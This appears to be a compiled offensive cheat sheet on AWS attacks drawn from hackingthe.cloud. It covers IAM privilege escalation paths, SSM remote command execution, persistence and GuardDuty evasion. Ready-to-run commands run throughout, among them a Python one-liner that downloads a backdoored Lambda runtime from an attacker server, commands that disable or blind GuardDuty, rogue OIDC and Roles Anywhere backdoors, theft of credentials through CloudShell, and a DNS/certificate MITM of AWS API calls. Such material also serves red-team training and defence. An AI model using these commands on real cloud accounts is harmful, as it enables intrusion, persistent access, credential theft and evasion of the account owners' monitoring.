# HackingThe.Cloud — Comprehensive Technique Reference
# Generated from 15 high-value hackingthe.cloud files
# Date: 2026-06-06

================================================================================
SECTION 1: IAM PRIVILEGE ESCALATION PATHS (30 techniques)
================================================================================
Source: iam_privilege_escalation.md (+ supplementary from other files)

## 1A: Direct IAM Permission Abuse (Single-Permission Escalations)

### codestar:CreateProject + codestar:AssociateTeamMember
  - Creates a CodeStar project, associates attacker as Owner
  - Attaches a policy granting iam:ListRoles, iam:ListUsers, lambda:List*, etc.
  - Useful for enumeration pivot

### glue:UpdateDevEndpoint
  - Updates SSH key on a Glue Dev Endpoint
  - SSH into the host, steal IAM creds from the attached role
  - Helpful complementary perm: glue:GetDevEndpoint

### iam:AddUserToGroup
  - Add attacker-controlled IAM user to a more privileged group

### iam:AttachGroupPolicy
  - Attach AdministratorAccess (or other) to a group attacker is a member of

### iam:AttachRolePolicy
  - Attach AdministratorAccess to a role attacker can assume

### iam:AttachUserPolicy
  - Attach AdministratorAccess to an IAM user attacker controls

### iam:CreateAccessKey
  - Create new access key + secret for a more privileged user
  - Also a persistence technique (see Section 3)

### iam:CreateLoginProfile
  - Create a console password for a more privileged IAM user
  - If password already set, use iam:UpdateLoginProfile instead
  - Also a persistence technique (see Section 3)

### iam:CreatePolicyVersion
  - Create a new version of an existing policy with more privileges
  - Requires attacker's principal to be attached to that policy

### iam:DeleteRolePermissionsBoundary
  - Remove permissions boundary from an accessible role
  - If the boundary was restrictive, effective permissions increase

### iam:DeleteRolePolicy
  - Delete an inline policy from an accessible role
  - Increases effective permissions if policy contained explicit denies

### iam:DeleteUserPermissionsBoundary
  - Remove permissions boundary from an accessible user

### iam:DeleteUserPolicy
  - Delete an inline policy from an accessible user
  - Increases effective permissions if policy contained explicit denies

### iam:DetachRolePolicy
  - Remove a managed policy from an accessible role
  - Increases effective permissions if policy contained explicit denies

### iam:DetachUserPolicy
  - Remove a managed policy from an accessible user
  - Increases effective permissions if policy contained explicit denies

### iam:PutGroupPolicy
  - Create an inline policy for a group attacker is in (e.g., admin access)

### iam:PutRolePermissionsBoundary
  - Update permissions boundary on accessible role (loosen restrictions)

### iam:PutRolePolicy
  - Create an inline policy for an accessible role (e.g., admin access)

### iam:PutUserPermissionsBoundary
  - Update permissions boundary on accessible user (loosen restrictions)

### iam:PutUserPolicy
  - Create an inline policy for an accessible user (e.g., admin access)

### iam:SetDefaultPolicyVersion
  - Revert a policy to a previous version that had more access

### iam:UpdateAssumeRolePolicy
  - Modify the assume-role trust policy of a role so attacker can assume it
  - Primary target: administrator roles or more privileged roles
  - Also a persistence technique (see Section 3)

### iam:UpdateLoginProfile
  - Change the password of an IAM user, log into console as them
  - Also a persistence technique (see Section 3)

### lambda:UpdateFunctionCode
  - Modify an existing Lambda function's code
  - Gain privileges of the associated IAM role on next invocation

### lambda:UpdateFunctionConfiguration
  - Modify existing Lambda's configuration to add a malicious Lambda Layer
  - Layer overrides an existing library to execute code under the Lambda's role

## 1B: iam:PassRole + Service Create/Update (Multi-Permission Escalations)

### iam:PassRole + autoscaling:CreateAutoScalingGroup/UpdateAutoScalingGroup + autoscaling:CreateLaunchConfiguration
  - Create launch config with more privileged role, use in ASG

### iam:PassRole + autoscaling:CreateAutoScalingGroup/UpdateAutoScalingGroup + ec2:CreateLaunchTemplate
  - Create launch template with privileged role, use in ASG

### iam:PassRole + bedrock-agentcore:CreateCodeInterpreter + bedrock-agentcore:InvokeCodeInterpreter
  - NEW: Bedrock AgentCore code interpreter with arbitrary code execution
  - Pass a privileged role, execute arbitrary code in the interpreter

### iam:PassRole + cloudformation:CreateStack
  - Create CloudFormation stack with a more privileged role

### iam:PassRole + codestar:CreateProject
  - Create CodeStar project with a more privileged role (including admin)

### iam:PassRole + datapipeline:ActivatePipeline + datapipeline:CreatePipeline + datapipeline:PutPipelineDefinition
  - Create pipeline with more privileged role
  - Account must already have a role assumable by DataPipeline

### iam:PassRole + ec2:RunInstances
  - Create EC2 instance with more privileged role
  - User-data script can exfiltrate creds or perform actions
  - Stealth variant: do all API ops in user-data to avoid credential exfiltration finding
  - Role must have trust policy allowing EC2 service to assume it
  - Key insight: NO SSH/SSM access required — user data suffices

### iam:PassRole + ecs:RunTask
  - Launch Fargate task with privileged role + command overrides
  - Set assignPublicIp=ENABLED, use wget/curl to exfiltrate IAM creds

### iam:PassRole + ecs:StartTask + ecs:RegisterContainerInstance + ecs:DeregisterContainerInstance
  - Register compromised EC2 to an ECS cluster
  - Start a task with command overrides, retrieve task role credentials
  - Escalate to any role passable to ECS tasks

### iam:PassRole + glue:CreateDevEndpoint
  - Create Glue Dev Endpoint with more privileged role
  - Account must have a role assumable by Glue

### iam:PassRole + glue:CreateJob (+ glue:StartJobRun)
  - Create Glue job with more privileged role, start it

### iam:PassRole + glue:UpdateJob (+ glue:StartJobRun)
  - Update existing Glue job's role and command
  - Job may already have triggers for automatic execution

### iam:PassRole + lambda:AddPermission + lambda:CreateFunction
  - Create Lambda with existing role, add cross-account invoke permission

### iam:PassRole + lambda:CreateEventSourceMapping + lambda:CreateFunction
  - Create Lambda with privileged role, associate with DynamoDB table
  - Trigger on DynamoDB insert. Bonus: dynamodb:CreateTable + dynamodb:PutItem

### iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction
  - Create Lambda with privileged role, invoke immediately

================================================================================
SECTION 2: EC2 POST-EXPLOITATION COMMANDS
================================================================================
Source: run_shell_commands_on_ec2.md

## 2A: Send Command (ssm:SendCommand)

Base required permission: ssm:SendCommand
Recommended: ssm:ListCommandInvocations, ec2:DescribeInstances

### Standard shell command
  aws ssm send-command \
    --instance-ids "i-00000000000000000" \
    --document-name "AWS-RunShellScript" \
    --parameters commands="*shell commands here*"

### Retrieve command output
  aws ssm list-command-invocations \
    --command-id "command_id_guid" \
    --details

### Key stealth fact:
  SSM SendCommand contents log as "HIDDEN_DUE_TO_SECURITY_REASONS" in CloudTrail
  Defenders must rely on host-based controls to see command contents

## 2B: Alternative SSM Documents for Code Execution (7 techniques)

When AWS-RunShellScript and AWS-RunPowerShellScript are blocked/monitored:

### 1. AWS-RunSaltState
  - Downloads a Salt state file (YAML) from S3 or HTTP(S)
  - Executes via cmd.run in SaltStack
  - Requires SaltStack installed on target (not default)
  - Parameterized payload supported (host/port variables)

### 2. AWS-ApplyAnsiblePlaybooks
  - Downloads Ansible playbooks from S3 or GitHub
  - Can auto-install Ansible (InstallDependencies=True)
  - Executes shell commands through Ansible playbook tasks
  - Supports parameterized payloads (ExtraVariables)

### 3. AWS-RunAnsiblePlaybook
  - Similar to AWS-ApplyAnsiblePlaybooks but:
    - Only downloads from S3 and HTTP(S) (no GitHub)
    - Requires Ansible pre-installed on target
  - Same playbook format works

### 4. AWS-InstallPowerShellModule
  - Downloads PS modules from HTTP(S)
  - Executes arbitrary command after module installation
  - Module itself doesn't need to be malicious — the "commands" param runs post-install

### 5. AWS-InstallApplication
  - Downloads MSI files from HTTP(S), installs them
  - Can pass arguments to MSI installation
  - AV may flag malicious MSI files

### 6. AWS-RunRemoteScript
  - Downloads and executes scripts from S3 or GitHub
  - Works for both UNIX and Windows

### 7. AWS-RunDocument (THE BYPASS KING)
  - Downloads and executes OTHER SSM Documents
  - If AWS-RunDocument is not blocked, ALL other document blocks are bypassed
  - Copy blocked document content (e.g., AWS-RunShellScript), host on attacker server
  - Use AWS-RunDocument to execute the replica
  - Sources: GitHub, S3, HTTP(S), or inline parameter
  - Custom malicious SSM documents can be created with parameterized payloads
  - Example: Python reverse shell SSM document with host/port parameters

## 2C: Session Manager (ssm:StartSession)

Required permission: ssm:StartSession
Provides interactive SSH-like shell
  aws ssm start-session --target instance-id
Requires SSM Session Manager Plugin installed locally

## 2D: Tools

  EC2StepShell: Wrapper over SSM SendCommand for reverse-shell-like experience
    - Works on Windows/UNIX, public/private instances
    - Auto-detects OS
    - Uses ssm:SendCommand + ssm:GetCommandInvocation or ssm:ListCommandInvocations

  fun-with-ssm: Collection of malicious SSM documents and payloads
    - Pre-built reverse shell documents for various document types
    - Parameterized for host/port flexibility

================================================================================
SECTION 3: PERSISTENCE TECHNIQUES (Exact API Calls)
================================================================================
Sources: iam_persistence.md, lambda_persistence.md, iam_roles_anywhere_persistence.md,
         iam_rogue_oidc_identity_provider.md

## 3A: IAM User-Based Persistence

### Technique: Create Access Keys
  Required: iam:CreateAccessKey
  - Creates long-lived AKIA keys (no expiration)
  - Seen in wild: SCARLETEEL 2.0, GUI-Vil

### Technique: Create Login Profile
  Required: iam:CreateLoginProfile
  - Creates console password for any IAM user
  - Seen in wild: GUI-Vil

### Technique: Update Assume Role Policy
  Required: iam:UpdateAssumeRolePolicy
  - Modify role trust policy to allow attacker's AWS account to assume it
  - Attach sts:AssumeRole for attacker's account

### Technique: Modify Login Profile
  Required: iam:UpdateLoginProfile
  - Change existing IAM user's password

## 3B: Survive Access Key Deletion
  Required: sts:GetFederationToken
  - Dedicated article: survive_access_key_deletion_with_sts_getfederationtoken
  - If access keys are deleted, federation tokens may still work

## 3C: EC2 Instance Persistence
  - Maintain code execution on EC2 with IAM role attached
  - Steal credentials from IMDS as needed
  - No additional API calls = stealthy

## 3D: Lambda Persistence (Runtime Backdooring)

### Python Runtime Backdoor
  - After RCE on Lambda, replace /var/runtime/bootstrap.py
  - Backdoor bootstrap.py to exfiltrate event data
  - Use Runtime API (localhost:9001) to terminate current event gracefully
  - Swap new runtime in via one-liner
  - Host modified bootstrap.py on attacker server

  One-liner:
    python3 -c "import urllib3;import os;http = urllib3.PoolManager();
    r = http.request('GET', 'https://evil.server/bootstrap.py');
    w = open('/tmp/bootstrap.py', 'w');w.write(r.data.decode('utf-8'));w.close();
    r = http.request('GET', 'http://127.0.0.1:9001/2018-06-01/runtime/invocation/next');
    rid = r.headers['Lambda-Runtime-Aws-Request-Id'];
    http.request('POST', f'http://127.0.0.1:9001/2018-06-01/runtime/invocation/{rid}/response',
    body='null', headers={'Content-Type':'application/x-www-form-urlencoded'});
    os.system('python3 /tmp/bootstrap.py')"

  COLD START WARNING: Lambda becomes "cold" after 5-15 min of inactivity.
  Keep function warm or reestablish persistence.

### Ruby Runtime Backdoor
  - Same concept, target /var/runtime/lib/runtime.rb
  - Rename to run.rb, symlink /var/runtime/lib/* to /tmp
  - One-liner includes: ln -s /var/runtime/lib/* /tmp && ruby backdoor

### Listener Setup
  - Nginx server with custom log_format postdata $request_body
  - Dedicated /post endpoint logging to postdata.log

## 3E: IAM OIDC Identity Provider Persistence
  Required: iam:CreateOpenIDConnectProvider + iam:UpdateAssumeRolePolicy

  - Deploy attacker-controlled OIDC IdP server (RogueOIDC tool)
  - Requires a real domain with valid TLS cert (AWS rejects self-signed)
  - Create OIDC provider in victim account:
    aws iam create-open-id-connect-provider --url https://oidc.attacker.com --client-id-list oidc_client

  Two sub-variants:
    1. Create NEW role with trust for the OIDC provider + attach AdministratorAccess
       aws iam create-role --role-name poc-xxx --assume-role-policy-document file://policy.json
       aws iam attach-role-policy --role-name poc-xxx --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

    2. Backdoor EXISTING role by modifying its trust policy
       aws iam update-assume-role-policy --role-name existing-role --policy-document file://policy.json
       (Role continues normal operation + attacker can assume it via OIDC)

  Assume the role on demand:
    assume-role-rogue-oidc.py --oidc-url https://oidc.example.com --client-id X \
      --client-secret Y --role-arn arn:aws:iam::ACCOUNT:role/ROLENAME

  Evasion benefit: Complexity may evade detection longer than simpler methods

## 3F: IAM Roles Anywhere Persistence
  Required: rolesanywhere:CreateTrustAnchor, rolesanywhere:CreateProfile,
            iam:CreateRole (or iam:UpdateAssumeRolePolicy), iam:PutRolePolicy

  Full attack chain:
    1. Generate attacker CA certificate + private key (openssl)
    2. Register CA as Trust Anchor in victim account:
       aws rolesanywhere create-trust-anchor --name "MyTrustAnchor" \
         --source "sourceData={x509CertificateData=BASE64},sourceType=CERTIFICATE_BUNDLE" \
         --enabled
    3. Create IAM role with trust for rolesanywhere.amazonaws.com:
       Trust policy: Principal Service=rolesanywhere.amazonaws.com
       Condition: ArnEquals aws:SourceArn = trustAnchorArn
    4. Attach admin policy to role (optional — even sts:GetCallerIdentity proves access)
       aws iam put-role-policy --role-name X --policy-name Y --policy-document file://...
    5. Create Profile linking trust anchor to role:
       aws rolesanywhere create-profile --name "MyProfile" \
         --role-arns ROLE_ARN --duration-seconds 3600 --enabled
    6. Generate client certificate signed by attacker CA
    7. Use aws_signing_helper credential-process to obtain temp creds from outside AWS

  Key advantage: Persistent AWS access from OUTSIDE the cloud — no console/cookies needed
  Uses X.509 certs so no OIDC domain infrastructure required
  Stratus Red Team simulation: aws.persistence.rolesanywhere-create-trust-anchor

## 3G: Other Persistence Techniques (referenced but not fully expanded in these files)

  - User Data Script Persistence: Backdoor EC2 user data scripts
  - CodeBuild GitHub Runner Persistence
  - IAM Persistence through Eventual Consistency (race condition on IAM changes)

================================================================================
SECTION 4: GUARDDUTY EVASION TECHNIQUES
================================================================================
Sources: modify-guardduty-config.md, guardduty-pentest.md, steal-keys-undetected.md,
         using_stolen_iam_credentials.md

## 4A: Modify GuardDuty Configuration Directly

### Technique: Disable/Weaken the Detector
  Required: guardduty:ListDetectors, guardduty:UpdateDetector

  - Disable detector entirely:
    aws guardduty update-detector --detector-id ID --no-enable

  - Remove S3 as data source (stops S3 Protection findings):
    aws guardduty update-detector --detector-id ID --data-sources S3Logs={Enable=false}

  - Remove Kubernetes data source:
    Similar approach for Kubernetes protection

  - Increase finding frequency to 6 hours (max delay):
    aws guardduty update-detector --detector-id ID --finding-publishing-frequency SIX_HOURS

### Technique: Modify Trusted IP Lists
  Required: guardduty:ListDetectors, guardduty:ListIPSets, guardduty:CreateIPSet,
            guardduty:UpdateIPSet, iam:PutRolePolicy

  - Add attacker IP to Trusted IP list
  - IPs in Trusted IP list: NO CloudTrail or VPC Flow Log alerts generated
  - NOTE: DNS findings are EXEMPT from Trusted IP list
  - File can be hosted in target S3 or attacker S3:
    aws guardduty update-ip-set --detector-id ID --ip-set-id IPID \
      --location https://malicious-bucket.s3.amazonaws.com/customiplist.csv --activate

### Technique: Disable/Modify CloudWatch Events Rules
  Required: events:ListRules, events:ListTargetsByRule, events:PutRule, events:RemoveTargets

  - Disable GuardDuty event rule:
    aws events put-rule --name guardduty-event \
      --event-pattern '{"source":["aws.guardduty"]}' --state DISABLED

  - Modify event pattern to match nothing:
    aws events put-rule --name guardduty-event \
      --event-pattern '{"source":["aws.somethingthatdoesntexist"]}'

  - Remove event targets (stops remediation):
    aws events remove-targets --name guardduty-event --ids "GuardDutyTarget"

### Technique: Create Suppression Rules (Auto-Archive Findings)
  Required: guardduty:CreateFilter

  - Auto-archive findings matching attacker activity via filters:
    aws guardduty create-filter --action ARCHIVE --detector-id ID \
      --name filter-name --finding-criteria file://criteria.json

### Technique: Delete Publishing Destination
  Required: guardduty:DeletePublishingDestination

  - Delete destination for GuardDuty alerts:
    aws guardduty delete-publishing-destination --detector-id ID --destination-id DEST

## 4B: Evade GuardDuty Pentest Findings (User-Agent Spoofing)

  Finding: PenTest:IAMUser/KaliLinux (and Parrot, Pentoo)
  Trigger: AWS CLI sends OS-identifying User-Agent string

  Evasion via Burp Suite:
    1. Set up HTTP match-and-replace rule:
       Match: ^User-Agent.*$ (regex)
       Replace: User-Agent: <spoofed string>
    2. Route AWS CLI through Burp proxy:
       export HTTPS_PROXY=http://127.0.0.1:8080
       export HTTP_PROXY=http://127.0.0.1:8080
    3. Handle SSL (add cert or use --no-verify-ssl)

  Advanced: Spoof user-agent matching victim's expected OS (e.g., if dev uses
  Windows, don't suddenly use Linux user-agent)

## 4C: Evade InstanceCredentialExfiltration GuardDuty Findings

  Finding #1: UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS
    - Triggers when EC2 IAM creds used from outside AWS

  Finding #2: UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.InsideAWS
    - Triggers when EC2 IAM creds used from ANY EC2 instance not in the same account
    - Released Jan 2022, closes the "use your own EC2" bypass

  BYPASS: VPC Endpoints
    - Using VPC Endpoints does NOT trigger the finding (as of technique publication)
    - Setup: EC2 in private subnet + VPC Endpoints for target services
    - Tool: SneakyEndpoints (Terraform) — auto-deploys EC2 + VPC Endpoints
    - WARNING (Oct 2024+): GuardDuty began detecting bypasses for services with
      CloudTrail network activity events for VPC endpoints. Initially EC2, KMS,
      Secrets Manager, CloudTrail — expanded to 26 services by mid-2025.

  STS Quirk with VPC Endpoints:
    export AWS_STS_REGIONAL_ENDPOINTS=regional
    (Some SDK versions default to global sts.amazonaws.com — VPC endpoints are regional)

  Alternative Bypass: Compromise one EC2 in target account first, then use that
  as staging for all stolen credentials — finding is account-scoped, not instance-scoped.

## 4D: Stealthy Credential Validation (Avoid sts:GetCallerIdentity)

  Problem: sts:GetCallerIdentity logs to CloudTrail — defenders can detect anomalous use
  Solution: Use data events that are NOT logged to CloudTrail by default

  Technique: aws sqs list-queues
    - Returns error containing ARN + account ID (same info as GetCallerIdentity)
    - SQS ListQueues is a data event — NOT logged by default, cannot always be logged
    - See full article: hackingthe.cloud/aws/enumeration/whoami

================================================================================
SECTION 5: ORGANIZATION-LEVEL ATTACK PATTERNS
================================================================================
Source: aws_organizations_defaults.md

## 5A: Default OrganizationAccountAccessRole (The Golden Path)

  - When an account is CREATED through Organizations, AWS automatically creates
    OrganizationAccountAccessRole in the member account
  - Default: AdministratorAccess policy attached
  - Default trust: sts:AssumeRole for the management account (arn:aws:iam::MGMT:root)
  - IMPACT: Compromise management account = compromise EVERY member account as admin
  - Only applies to accounts CREATED through Organizations (not invited accounts)
  - Pacu module: organizations__assume_role — brute forces role names across accounts

## 5B: Trusted Access & Delegated Administration

  Trusted Access:
    - Management account enables organization-integrated features for services
    - CLI: aws organizations enable-aws-service-access / list-aws-service-access-for-organization
    - When enabled, service can create roles in member accounts to do its work

  Delegated Administration:
    - Member account granted permission to manage specific organization-integrated feature
    - CLI: aws organizations list-delegated-administrators
    - Delegated admin gains READ-ONLY APIs on the organization (e.g., list-accounts)
    - As of late 2022: delegated admins may manipulate SCPs

## 5C: IAM Access Analyzer — Indirect Pivot Path

  - Organization-integrated feature — scans ALL roles across ALL accounts
  - From management account (with trusted access enabled): run Access Analyzer
    org-wide, find misconfigured roles to pivot to ANY member account
  - From delegated admin member account: same capability
  - NEVER directly accesses member accounts — indirect intelligence gathering

## 5D: IAM Identity Center — Direct Pivot Path

  - Organization-integrated feature supporting trusted access
  - From management account (with permissions):
    1. Enable trusted access for IAM Identity Center
    2. Create user entity with attacker's email + password
    3. Create permission set = AdministratorAccess
    4. Attach user + permission set to ANY member account
    5. Navigate to IAM Identity Center login URL
    6. Login as the user → direct Administrator access to member account

## 5E: Organization Enumeration

  Pacu module: organizations__enum
    - Enumerates org structure, delegated admins, trusted access, SCPs
    - Stores results: data organizations

================================================================================
SECTION 6: ADDITIONAL TECHNIQUES (Not Easily Categorized Above)
================================================================================

## 6A: Obfuscated Admin IAM Policy (Evasion via Wildcards)
  Source: obfuscated_admin_policy.md

  Bypasses simple pattern-matching detections that look for "Action":"*" or
  AdministratorAccess policy ARN.

  Technique 1: Service-Action Wildcard Split
    "Action": "*:*" — semantically identical to "*" but different string

  Technique 2: Single-Character Wildcards on Service Names
    "Action": ["?am:*", "s?s:*", "?t?:*", "??2:*", "?3:*", "???bda:*", "???s:*"]
    This covers: iam, ram, sqs, sns, sms, sts, ec2, ss2, s3, lambda, logs, ecs, eks, kms

  Technique 3: Partial Action Wildcards
    "Action": ["iam:Creat*", "iam:Attac*", "iam:Put*", "iam:Pass*", "iam:Delet*",
               "iam:Updat*", "iam:List*", "iam:Get*", "sts:As*", "s3:*bject*",
               "ec2:Run*", "ec2:Describe*", "lambda:Creat*", "lambda:Invok*", "lambda:Updat*"]
    Covers all impactful IAM/STS/S3/EC2/Lambda operations — no bare "*"

  Technique 4: Multiple Statements with Broad Wildcards
    Split across statements: ReadOnly (*:Get*, *:List*, *:Describe*),
    Operations (*:Create*, *:Delete*, *:Update*, *:Put*, *:Attach*, *:Detach*),
    Invoke (*:Run*, *:Start*, *:Stop*, *:Invoke*, *:Execute*)
    Each statement looks scoped — aggregate = full admin

  Technique 5: Hiding as Inline Policy
    Use inline policy (iam:PutUserPolicy/iam:PutRolePolicy) instead of managed
    Inline policies don't show in ListAttached*Policies — need GetUserPolicy/GetRolePolicy
    Use misleading names like "AmazonPersonalizeReadOnly"

  Detection: IAM Access Analyzer ValidatePolicy API, Parliament tool,
    CloudTrail monitoring for policy creation/modification with wildcards

## 6B: Get IAM Credentials from Console Session
  Source: get_iam_creds_from_console_session.md

  Scenario: Have browser session cookies (e.g., cookies.sqlite from Firefox) but
  no .aws credentials.

  Method 1: CloudShell Metadata Endpoint
    Navigate to CloudShell in browser with victim's cookies loaded, then:
      TOKEN=$(curl -X PUT localhost:1338/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
      curl localhost:1338/latest/meta-data/container/security-credentials -H "X-aws-ec2-metadata-token: $TOKEN"
    OR:
      aws configure export-credentials --format env
    Returns temp creds with ~15 min TTL

  Method 2: boto3 in CloudShell
    import boto3
    session = boto3.Session()
    creds = session.get_credentials()
    # AccessKey, SecretKey, Token obtained programmatically

  Method 3: Console Service Endpoints (/tb/creds)
    Each service exposes: https://REGION.console.aws.amazon.com/SERVICE/tb/creds
    Examples: /s3/tb/creds, /ec2/tb/creds, /lambda/tb/creds, /console/tb/creds
    Returns JSON: accessKeyId, secretAccessKey, sessionToken, expiration
    Credentials are service-scoped (S3 endpoint returns S3-scoped creds)
    Can extract via browser DevTools Network tab (filter "tb/creds")

  Automated tool: CLIer (browser extension)
    Intercepts fetch() and XMLHttpRequest to /tb/creds endpoints
    Exports credentials in Bash, PowerShell, AWS config, JSON, or QR code

  Key Evasion Benefit:
    - No additional CloudTrail logs beyond normal Console usage
    - Same endpoints the Console uses legitimately
    - Indistinguishable from normal Console activity at API level

## 6C: Route53 Modification Privilege Escalation (AWS API Call Hijacking)
  Source: route53_modification_privilege_escalation.md

  Required: route53:CreateHostedZone, route53:ChangeResourceRecordSets,
            acm-pca:IssueCertificate, acm-pca:GetCertificate
  Recommended: route53:GetHostedZone, route53:ListHostedZones,
              acm-pca:ListCertificateAuthorities, ec2:DescribeVpcs

  Preconditions:
    - Target account must have ACM Private CA already set up
    - EC2 instances must have imported/trust the CA certificates

  Attack Flow:
    1. Create private hosted zone for an AWS API domain (e.g., secretsmanager.us-east-1.amazonaws.com)
       aws route53 create-hosted-zone --name secretsmanager.us-east-1.amazonaws.com \
         --caller-reference ref --hosted-zone-config PrivateZone=true --vpc VPCRegion=us-east-1,VPCId=VPCID
    2. Set A record pointing to attacker's IP in the VPC (TTL=0 to avoid DNS caching)
    3. Generate CSR with CN=secretsmanager.us-east-1.amazonaws.com
    4. Get ACM-PCA to issue certificate:
       aws acm-pca issue-certificate --certificate-authority-arn ARN --csr file://csr --signing-algorithm SHA256WITHRSA
    5. Retrieve signed cert:
       aws acm-pca get-certificate --certificate-arn CERTARN --certificate-authority-arn CAARN
    6. Start TLS listener on port 443 with the signed cert:
       sudo ncat --listen -p 443 --ssl --ssl-cert cert.crt --ssl-key key -v
    7. MITM all AWS API calls from VPC → attacker captures IAM creds / sensitive data
    8. Forward calls to real VPC Endpoint for uninterrupted service

  Why it works:
    - AWS SDKs don't use certificate pinning
    - Route53 allows private hosted zones for AWS API domains
    - ACM-PCA cannot be restricted to signing only specific Common Names

## 6D: EC2 Metadata SSRF (Classic Technique)
  Source: ec2-metadata-ssrf.md

  Paths:
    http://169.254.169.254/latest/meta-data/iam/           — check if role exists
    http://169.254.169.254/latest/meta-data/iam/security-credentials/  — get role name
    http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLENAME/ — get creds

  Mitigation: Enforce IMDSv2 (requires PUT session token first)
    - IMDSv2 blocks simple SSRF/XXE attacks
    - Code execution on host bypasses IMDSv2 regardless

## 6E: Using Stolen IAM Credentials (Operational Guide)
  Source: using_stolen_iam_credentials.md

  Credential Types:
    - Long-term: AKIA... (20 char access key + 40 char secret) — no expiry
    - Temporary: ASIA... (20 char access key + 40 char secret + session token) — 15 min to hours

  Validity Check:
    - Primary: aws sts get-caller-identity (always works, even with explicit deny)
    - Stealth: aws sqs list-queues (data event, no CloudTrail by default)

  Situational Awareness:
    - Enumerate service-linked roles to discover what services the account uses
    - Determines: GuardDuty presence? Org membership? ECS/EKS/EC2 usage?
    - All without triggering management events

================================================================================
SECTION 7: QUICK-REFERENCE PERMISSION-TO-ATTACK MAPPING
================================================================================

IAM ESCALATION:
  iam:AddUserToGroup                  → Add self to privileged group
  iam:AttachGroupPolicy               → Attach admin policy to own group
  iam:AttachRolePolicy                → Attach admin policy to accessible role
  iam:AttachUserPolicy                → Attach admin policy to own user
  iam:CreateAccessKey                 → Create keys for more privileged user
  iam:CreateLoginProfile              → Create console password for any user
  iam:CreatePolicyVersion             → New policy version with more perms
  iam:DeleteRolePermissionsBoundary   → Remove boundary from role
  iam:DeleteRolePolicy                → Remove restrictive inline role policy
  iam:DeleteUserPermissionsBoundary   → Remove boundary from user
  iam:DeleteUserPolicy                → Remove restrictive inline user policy
  iam:DetachRolePolicy                → Remove restrictive managed role policy
  iam:DetachUserPolicy                → Remove restrictive managed user policy
  iam:PutGroupPolicy                  → Create inline admin policy on group
  iam:PutRolePermissionsBoundary      → Loosen role boundary
  iam:PutRolePolicy                   → Create inline admin policy on role
  iam:PutUserPermissionsBoundary      → Loosen user boundary
  iam:PutUserPolicy                   → Create inline admin policy on user
  iam:SetDefaultPolicyVersion         → Revert to more permissive version
  iam:UpdateAssumeRolePolicy          → Modify trust to allow assumption
  iam:UpdateLoginProfile              → Change user password

IAM PASSROLE + CREATE:
  + autoscaling:CreateLaunchConfiguration + autoscaling:Create/UpdateAutoScalingGroup
  + autoscaling:Create/UpdateAutoScalingGroup + ec2:CreateLaunchTemplate
  + bedrock-agentcore:CreateCodeInterpreter + bedrock-agentcore:InvokeCodeInterpreter
  + cloudformation:CreateStack
  + codestar:CreateProject
  + datapipeline:CreatePipeline + datapipeline:PutPipelineDefinition + datapipeline:ActivatePipeline
  + ec2:RunInstances
  + ecs:RunTask
  + ecs:StartTask + ecs:RegisterContainerInstance + ecs:DeregisterContainerInstance
  + glue:CreateDevEndpoint
  + glue:CreateJob (+ glue:StartJobRun)
  + glue:UpdateJob (+ glue:StartJobRun)
  + lambda:CreateFunction + lambda:AddPermission (cross-account invoke)
  + lambda:CreateFunction + lambda:CreateEventSourceMapping (DynamoDB trigger)
  + lambda:CreateFunction + lambda:InvokeFunction

OTHER ESCALATION:
  codestar:CreateProject + codestar:AssociateTeamMember
  glue:UpdateDevEndpoint
  lambda:UpdateFunctionCode
  lambda:UpdateFunctionConfiguration

PERSISTENCE:
  iam:CreateAccessKey                          → Long-lived keys
  iam:CreateLoginProfile                       → Console password
  iam:UpdateAssumeRolePolicy                   → Cross-account trust
  iam:UpdateLoginProfile                       → Change password
  iam:CreateOpenIDConnectProvider              → Rogue OIDC IdP (+ UpdateAssumeRolePolicy)
  rolesanywhere:CreateTrustAnchor              → IAM Roles Anywhere persistence
  rolesanywhere:CreateProfile                  → IAM Roles Anywhere profile
  iam:CreateRole + iam:PutRolePolicy           → New backdoor role
  iam:AttachRolePolicy                         → Attach admin to role
  sts:GetFederationToken                       → Survive access key deletion

GUARDDUTY EVASION:
  guardduty:UpdateDetector                     → Disable, remove sources, slow frequency
  guardduty:UpdateIPSet / CreateIPSet          → Add attacker IP to trusted list
  events:PutRule / RemoveTargets               → Disable/reroute CloudWatch events
  guardduty:CreateFilter                       → Auto-archive findings
  guardduty:DeletePublishingDestination        → Stop alert forwarding
  Burp Suite proxy                             → User-agent spoofing
  VPC Endpoints + SneakyEndpoints              → Bypass credential exfiltration finding
  sqs:ListQueues                               → Stealthy credential validation

ORGANIZATION ATTACKS:
  sts:AssumeRole (default) → OrganizationAccountAccessRole from management account
  organizations:ListAccounts (from delegated admin)
  IAM Identity Center user + permission set creation → direct member access

EC2 POST-EXPLOITATION:
  ssm:SendCommand           → Run shell commands (AWS-RunShellScript + 6 alternatives)
  ssm:StartSession          → Interactive SSH-like shell
  ssm:ListCommandInvocations → Retrieve command output
  ec2:DescribeInstances     → Find target instances

CLOUDSHELL/SESSION CREDENTIAL THEFT:
  Browser session cookies → CloudShell → localhost:1338 creds
  Browser session cookies → /SERVICE/tb/creds endpoints
  CLIer browser extension → Automated extraction

API HIJACKING:
  route53:CreateHostedZone + route53:ChangeResourceRecordSets
    + acm-pca:IssueCertificate + acm-pca:GetCertificate
  → MITM AWS API traffic inside VPC

OBFUSCATED ADMIN POLICY:
  iam:CreatePolicy / iam:PutUserPolicy / iam:PutRolePolicy
  → Use "*:*", "?am:*", partial wildcards, split statements, misleading names
  → Hide as inline policy with benign-looking name

================================================================================
END OF REFERENCE
================================================================================
